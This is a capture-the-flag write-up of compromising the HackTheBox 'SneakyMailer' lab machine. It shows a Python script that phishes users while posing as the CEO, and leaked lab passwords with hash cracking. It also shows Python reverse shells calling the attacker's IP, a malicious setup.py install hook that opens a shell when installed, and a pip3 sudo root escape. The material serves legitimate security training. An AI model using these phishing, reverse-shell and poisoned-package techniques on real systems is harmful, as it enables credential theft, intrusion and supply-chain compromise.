---
title: HackTheBox - Sneaky Mailer 
category: writeup
tags: hackthebox
---

# Summary 
SneakyMailer is a medium rated Linux machine which involves using phishing attacks to gain a users credentials using which we are able to log into their mail account which reveals the credentials for another user who has full write access to the dev.sneakmailer.htb domain through FTP. Uploading a shell and enumerating reveals the password for the user pypi which are used to upload a malicious python package on the server. These packages when uploaded are executed by the user low giving us a reverse shell. The user low has root rights to execute pip3 which is then used to spawn a shell as root using GTFOBins.
# NMAP:

Nmap scan reveals the following:

```bash
PORT     STATE SERVICE  REASON         VERSION                                                                                                                                                                                             
21/tcp   open  ftp      syn-ack ttl 63 vsftpd 3.0.3                                                                                                                                                                                        
22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)                                                                                                                                                      
| ssh-hostkey:                                                                                                                                                                                                                             
|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)                                                                                                                                                                             
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCy6l2NxLZItm85sZuNKU/OzDEhlvYMmmrKpTD0+uxdQyySppZN3Lo6xOM2dC6pqG5DQjz+GPJl1/kbdla6qJXDZ1D5lnnCaImTqU++a1WceLck3/6/04B5RlTYUoLQFwRuy84CX8NDvs0mIyR7bpbd8W03+EAwTabOxXfukQG1MbgCY5V8QmLRdi/ZtsIqVxVZW
OYI5rvuAQ+YM9D/Oa6mwAO5l2V3/h/A5nHDx2Vkl1++kfDqFNop2D2vssInvdwLKZ0M5RvXLQPlsqRLfqtcTBBLxYY6ZVcLHkvEA+gekHGcPRw0MV5U9vsx18+6O8wm9ZNI/a1Y4TyXIHMcbHi9                                                                                        
|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)                                                                                                                                                                            
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOHL62JJEI1N8SHtcSypj9IjyD3dm6CA5iyog1Rmi4P5N6VtA/5RxBxegMYv7bTFymmFm02+w9zXdKMUcSs5TbE=                                                                         
|   256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)                                                                                                                                                                          
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILZ/TeP6ZPj9zbHyFVfwZg48EElGqKCENQgPw+QCoC7x                                                                                                                                                         
25/tcp   open  smtp     syn-ack ttl 63 Postfix smtpd                                                                                                                                                                                       
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,                                                                                                          
80/tcp   open  http     syn-ack ttl 63 nginx 1.14.2                                                                                                                                                                                        
| http-methods:                                                                                                                                                                                                                            
|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                                                                                               
|_http-server-header: nginx/1.14.2                                                                                                                                                                                                         
|_http-title: Did not follow redirect to http://sneakycorp.htb                                                                                                                                                                             
143/tcp  open  imap     syn-ack ttl 63 Courier Imapd (released 2018)                                                                                                                                                                       
|_imap-capabilities: THREAD=ORDEREDSUBJECT CAPABILITY ENABLE STARTTLS UTF8=ACCEPTA0001 SORT OK CHILDREN NAMESPACE IMAP4rev1 completed ACL2=UNION IDLE THREAD=REFERENCES ACL UIDPLUS QUOTA                                                  
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US/organizationalUnitName=Automatically-generated IMAP SSL key/localityName=New York                                     
| Subject Alternative Name: email:postmaster@example.com                                                                                                                                                                                   
| Issuer: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US/organizationalUnitName=Automatically-generated IMAP SSL key/localityName=New York                                                
| Public Key type: rsa                                                                                                                                                                                                                     
| Public Key bits: 3072                                                                                                                                                                                                                    
| Signature Algorithm: sha256WithRSAEncryption                                                                                                                                                                                             
| Not valid before: 2020-05-14T17:14:21                                                                                                                                                                                                    
| Not valid after:  2021-05-14T17:14:21                                                                                                                                                                                                    
| MD5:   3faf 4166 f274 83c5 8161 03ed f9c2 0308                                                                                                                                                                                           
| SHA-1: f79f 040b 2cd7 afe0 31fa 08c3 b30a 5ff5 7b63 566c                                                                                                                                                                                 
| -----BEGIN CERTIFICATE-----                                                                                                                                                                                                              
| MIIE6zCCA1OgAwIBAgIBATANBgkqhkiG9w0BAQsFADCBjjESMBAGA1UEAxMJbG9j                                                                                                                                                                         
| YWxob3N0MS0wKwYDVQQLEyRBdXRvbWF0aWNhbGx5LWdlbmVyYXRlZCBJTUFQIFNT                                                                                                                                                                         
| TCBrZXkxHDAaBgNVBAoTE0NvdXJpZXIgTWFpbCBTZXJ2ZXIxETAPBgNVBAcTCE5l                                                                                                                                                                         
| dyBZb3JrMQswCQYDVQQIEwJOWTELMAkGA1UEBhMCVVMwHhcNMjAwNTE0MTcxNDIx                                                                                                                                                                         
| WhcNMjEwNTE0MTcxNDIxWjCBjjESMBAGA1UEAxMJbG9jYWxob3N0MS0wKwYDVQQL                                                                                                                                                                         
| EyRBdXRvbWF0aWNhbGx5LWdlbmVyYXRlZCBJTUFQIFNTTCBrZXkxHDAaBgNVBAoT                                                                                                                                                                         
| E0NvdXJpZXIgTWFpbCBTZXJ2ZXIxETAPBgNVBAcTCE5ldyBZb3JrMQswCQYDVQQI                                                                                                                                                                         
| EwJOWTELMAkGA1UEBhMCVVMwggGiMA0GCSqGSIb3DQEBAQUAA4IBjwAwggGKAoIB                                                                                                                                                                         
| gQDCzBP4iuxxLmXPkmi5jABQrywLJK0meyW49umfYhqayBH7qtuIjyAmznnyDIR0                                                                                                                                                                         
| 543qHgWAfSvGHLFDB9B1wnkvAU3aprjURn1956X/4jEi9xmhRwvum5T+vp3TT96d                                                                                                                                                                         
| JgW9SSLiPFQty5eVrKuQvg1bZg/Vjp7CUUQ0+7PmdylMOipohls5RDEppCDGFmiS                                                                                                                                                                         
| HN0ZayXpjd/kwqZ/O9uTJGHOzagY+ruTYAx3tanO4oDwdrz9FPr3S2KNPTjjtzqf                                                                                                                                                                         
| CPdcsi+6JTQJI03eMEftBKo3HZTp7Hx6FObZcvcNskTLqtsYZYuzHS7KQwiuTAJ5                                                                                                                                                                         
| d/ZKowCeJDaVlS35tQleisu+pJCkwcStpM1BJ51UQRZ5IpvItTfnrChEa1uyTlAy                                                                                                                                                                         
| ZIOQK2/+34K2ZrldYWyfKlYHxieGZgzQXLo/vyW/1gqzXy7KHx+Uuf4CAzzOP1p3                                                                                                                                                                         
| 8QNmvsqkJrQMuH3XPXLswr9A1gPe7KTLEGNRJSxcGF1Q25m4e04HhZzK76KlBfVt                                                                                                                                                                         
| IJ0CAwEAAaNSMFAwDAYDVR0TAQH/BAIwADAhBgNVHREEGjAYgRZwb3N0bWFzdGVy                                                                                                                                                                         
| QGV4YW1wbGUuY29tMB0GA1UdDgQWBBTylxdM/AHlToKxNvmnPdXJCjjbnDANBgkq                                                                                                                                                                         
| hkiG9w0BAQsFAAOCAYEAAo7NqfYlXSEC8q3JXvI5EeVpkgBDOwnjxuC/P5ziEU0c                                                                                                                                                                         
| PRx6L3w+MxuYJdndC0hT9FexXzSgtps9Xm+TE81LgNvuipZ9bulF5pMmmO579U2Y                                                                                                                                                                         
| suJJpORD4P+65ezkfWDbPbdKyHMeRvVCkZCH74z2rCu+OeQTGb6GLfaaB7v9dThR                                                                                                                                                                         
| rfvHwM50hxNb4Zb4of7Eyw2OJGeeohoG4mFT4v7cu1WwimsDF/A7OCVOmvvFWeRA                                                                                                                                                                         
| EjdEReekDJsBFpHa8uRjxZ+4Ch9YvbFlYtYi6VyXV1AFR1Mb91w+iIitc6ROzjJ2                                                                                                                                                                         
| pVO69ePygQcjBRUTDX5reuBzaF5p9/6Ta9HP8NDI9+gdw6VGVTmYRJUbj7OeKSUq                                                                                                                                                                         
| FWUmtZYC288ErDAZ7z+6VqJtZsPXIItZ8J6UZE3zBclGMcQ7peL9wEvJQ8oSaHHM                                                                                                                                                                         
| AmgHIoMwKXSNEkHbBD24cf9KwVhcyJ4QCrSJBMAys98X6TzCwQI4Hy7XyifU3x/L                                                                                                                                                                         
| XUFD0JSVQp4Rmcg5Uzuk                                                                                                                                                                                                                     
|_-----END CERTIFICATE-----                                                                                                                                                                                                                
|_ssl-date: TLS randomness does not represent time
993/tcp  open  ssl/imap syn-ack ttl 63 Courier Imapd (released 2018)
|_imap-capabilities: THREAD=ORDEREDSUBJECT CAPABILITY ENABLE IDLE UTF8=ACCEPTA0001 SORT OK CHILDREN AUTH=PLAIN NAMESPACE IMAP4rev1 completed ACL THREAD=REFERENCES ACL2=UNION UIDPLUS QUOTA
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US/organizationalUnitName=Automatically-generated IMAP SSL key/localityName=New York
| Subject Alternative Name: email:postmaster@example.com
| Issuer: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US/organizationalUnitName=Automatically-generated IMAP SSL key/localityName=New York
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-14T17:14:21
| Not valid after:  2021-05-14T17:14:21
| MD5:   3faf 4166 f274 83c5 8161 03ed f9c2 0308
| SHA-1: f79f 040b 2cd7 afe0 31fa 08c3 b30a 5ff5 7b63 566c 
| -----BEGIN CERTIFICATE-----
| MIIE6zCCA1OgAwIBAgIBATANBgkqhkiG9w0BAQsFADCBjjESMBAGA1UEAxMJbG9j
| YWxob3N0MS0wKwYDVQQLEyRBdXRvbWF0aWNhbGx5LWdlbmVyYXRlZCBJTUFQIFNT
| TCBrZXkxHDAaBgNVBAoTE0NvdXJpZXIgTWFpbCBTZXJ2ZXIxETAPBgNVBAcTCE5l
| dyBZb3JrMQswCQYDVQQIEwJOWTELMAkGA1UEBhMCVVMwHhcNMjAwNTE0MTcxNDIx
| WhcNMjEwNTE0MTcxNDIxWjCBjjESMBAGA1UEAxMJbG9jYWxob3N0MS0wKwYDVQQL
| EyRBdXRvbWF0aWNhbGx5LWdlbmVyYXRlZCBJTUFQIFNTTCBrZXkxHDAaBgNVBAoT
| E0NvdXJpZXIgTWFpbCBTZXJ2ZXIxETAPBgNVBAcTCE5ldyBZb3JrMQswCQYDVQQI
| EwJOWTELMAkGA1UEBhMCVVMwggGiMA0GCSqGSIb3DQEBAQUAA4IBjwAwggGKAoIB
| gQDCzBP4iuxxLmXPkmi5jABQrywLJK0meyW49umfYhqayBH7qtuIjyAmznnyDIR0
| 543qHgWAfSvGHLFDB9B1wnkvAU3aprjURn1956X/4jEi9xmhRwvum5T+vp3TT96d
| JgW9SSLiPFQty5eVrKuQvg1bZg/Vjp7CUUQ0+7PmdylMOipohls5RDEppCDGFmiS
| HN0ZayXpjd/kwqZ/O9uTJGHOzagY+ruTYAx3tanO4oDwdrz9FPr3S2KNPTjjtzqf
| CPdcsi+6JTQJI03eMEftBKo3HZTp7Hx6FObZcvcNskTLqtsYZYuzHS7KQwiuTAJ5
| d/ZKowCeJDaVlS35tQleisu+pJCkwcStpM1BJ51UQRZ5IpvItTfnrChEa1uyTlAy
| ZIOQK2/+34K2ZrldYWyfKlYHxieGZgzQXLo/vyW/1gqzXy7KHx+Uuf4CAzzOP1p3
| 8QNmvsqkJrQMuH3XPXLswr9A1gPe7KTLEGNRJSxcGF1Q25m4e04HhZzK76KlBfVt
| IJ0CAwEAAaNSMFAwDAYDVR0TAQH/BAIwADAhBgNVHREEGjAYgRZwb3N0bWFzdGVy
| QGV4YW1wbGUuY29tMB0GA1UdDgQWBBTylxdM/AHlToKxNvmnPdXJCjjbnDANBgkq
| hkiG9w0BAQsFAAOCAYEAAo7NqfYlXSEC8q3JXvI5EeVpkgBDOwnjxuC/P5ziEU0c
| PRx6L3w+MxuYJdndC0hT9FexXzSgtps9Xm+TE81LgNvuipZ9bulF5pMmmO579U2Y
| suJJpORD4P+65ezkfWDbPbdKyHMeRvVCkZCH74z2rCu+OeQTGb6GLfaaB7v9dThR
| rfvHwM50hxNb4Zb4of7Eyw2OJGeeohoG4mFT4v7cu1WwimsDF/A7OCVOmvvFWeRA
| EjdEReekDJsBFpHa8uRjxZ+4Ch9YvbFlYtYi6VyXV1AFR1Mb91w+iIitc6ROzjJ2
| pVO69ePygQcjBRUTDX5reuBzaF5p9/6Ta9HP8NDI9+gdw6VGVTmYRJUbj7OeKSUq
| FWUmtZYC288ErDAZ7z+6VqJtZsPXIItZ8J6UZE3zBclGMcQ7peL9wEvJQ8oSaHHM
| AmgHIoMwKXSNEkHbBD24cf9KwVhcyJ4QCrSJBMAys98X6TzCwQI4Hy7XyifU3x/L
| XUFD0JSVQp4Rmcg5Uzuk
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http     syn-ack ttl 63 nginx 1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
```

# Port 80:

Checking the website reveals a VHOST sneakycorp.htb:

![](/assets/img/sneakymailer/image1.png)

```python
wfuzz -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.sneakycorp.htb"  --hw 12 -t 100 10.10.10.197
```

Fuzzing for directories reveal a dev.sneakycorp.htb which might be useful later.

# Port 8080:

Checking the website reveals the default nginx page:

Fuzzing the page for vhosts reveals `pypi.sneakycorp.htb` which appears to be hosting a pypi server.

# Email:

Checking the Port 80 reveals that the owner of the company wants the new users to register using the new register form, by checking their emails. This could possibly be used to get the users to send me their POST data which we can intercept and get username and password for a user.

Sending emails to users as Cara Stevens (CEO) we get a request from Paul with his username and password:

```python
import smtplib

sender = 'carastevens@sneakymailer.htb'
receivers = []
# The user list obtained from the website
usernames=open("usernames.txt","r")
read_usernames = usernames.readlines()
# If the username has a \n char just remove it and add it to the list.
for i in read_usernames:
	if i[-1] == '\n':
		receivers.append(i[0:-1])
	else:
		recievers.append(i)
# Send emaill to everyone
for users in receivers:
	message = "From: From Person " + sender + "\n"
	message += "To: " + users + "\n"
	message += "Subject: password\n"
	message += "\n"
	message += "http://10.10.14.69/"
	try:
		smtpObj = smtplib.SMTP('10.10.10.197')
		smtpObj.sendmail(sender, receivers, message)
		print("Successfully sent email")
	except:
		print ("Error: unable to send email")
```

Using the credentials we log in to the mail server as paulbyrd with his password of `^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht`

Going through his emails reveals an email that he sent to the root user which gives us the password for developer. 

```
Hello administrator, I want to change this password for the developer account
 
Username: developer
Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
 
Please notify me when you do it
```

We also see another email that says the following:

```
Hello low

Your current task is to install, test and then erase every python module you 
find in our PyPI service, let me know if you have any inconvenience.
```

This indicates there is some sort of python package testing going on the machine by the user low who will execute the python packages that are uploaded to the machine.

# FTP

Using the developer's credentials to log in through ftp reveals that the user developer has write access to the dev directory which will most likely let us upload a webshell and access it through the dev.sneakycorp.htb VHOST we found earlier. 

# Exploit - Initial Foothold

Uploading a webshell and executing a reverse shell command gives us a shell.

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.69",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' &
```

Using [linEnum.sh](http://linenum.sh) we get pypi's password for htpasswd authentication.

![](/assets/img/sneakymailer/image2.png)

Cracking the hash reveals pypi's password.

```python
hashcat -m 1600 -a 0 pypi-pass /usr/share/wordlists/rockyou.txt
soufianeelhaoui
```

## Privilege Escalation - User (Low)

Using a python reverse shell in [setup.py](http://setup.py) in the shell and generating a tar.gz file will allow us to upload it to the server and gain a reverse shell.

```python
import socket,subprocess,os
import setuptools
from setuptools.command.install import install
class evil_py_class(install):
  def run(self):
    try:
    	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    	s.connect(("10.10.14.69", 443))
    	os.dup2(s.fileno(),0)
    	os.dup2(s.fileno(),1)
    	os.dup2(s.fileno(),2)
    	p=subprocess.call(["/bin/sh", "-i"])
    except:
    	pass

setuptools.setup(
  name="evil_py",
  version="1.0.0",
  author="sn0wfa11",
  author_email="dontemail@me.com",
  description="MSF Payload",
  long_description="long_description",
  long_description_content_type="text/markdown",
  url="https://github.com/sn0wfa11",
  packages=setuptools.find_packages(),
  cmdclass={ "install": evil_py_class }
)
```

```bash
python setup.py sdist bdist_wheel
twine upload --repository evil_py --repository-url http://pypi.sneakycorp.htb:8080 dist/* --verbose
nc -nvlp 443
```

We get a shell as the user low. 

# Privilege Escalation - Root

Using `sudo -l` we see that the user low can execute pip3 as root. 

Following GTFObins we get a rootshell.

```python
low@sneakymailer:~$ TF=$(mktemp -d)
low@sneakymailer:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
low@sneakymailer:~$ sudo pip3 install $TF
# id
root
```
